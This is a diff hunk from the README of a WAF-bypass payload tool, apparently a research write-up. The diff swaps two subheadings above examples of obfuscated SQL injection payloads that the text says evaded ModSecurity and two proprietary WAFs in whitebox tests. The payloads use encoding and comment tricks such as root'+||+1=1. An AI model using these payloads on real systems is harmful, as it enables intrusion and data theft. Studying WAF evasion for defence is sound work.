@@ -48,12 +48,12 @@ This mode is used when you have bypassed the WAF using the produced payloadList 
 When I started coding it I didn’t expect a single bypass, but at the end of the research I managed to bypass 3/3 of the given WAFs (Modsecurity and two proprietary solutions) in many different ways (XSS, SQLi and Command Injections).  
 The tests were in Whitebox and the plaintext payload was initially blocked by the WAFs.  
 Examples of crafted SQLi bypassing payloads:  
-Default SQLi Module
+Strict SQLi Module of a proprietary WAF  
 ```
 \u62acroot\uaab3'+%7C%7C+1=1;+--+-
 root'++++++++%7C%7C++++++++1=1;++++++++--++++++++-
 ```
-Strict SQLi Module of a proprietary WAF
+Default SQLi Module  
 ```
 roo/**/t\\'%0Cor%091=1;%0A--%0C-
 /*!00000root'+%7C%7C+1=1;+--+-*/
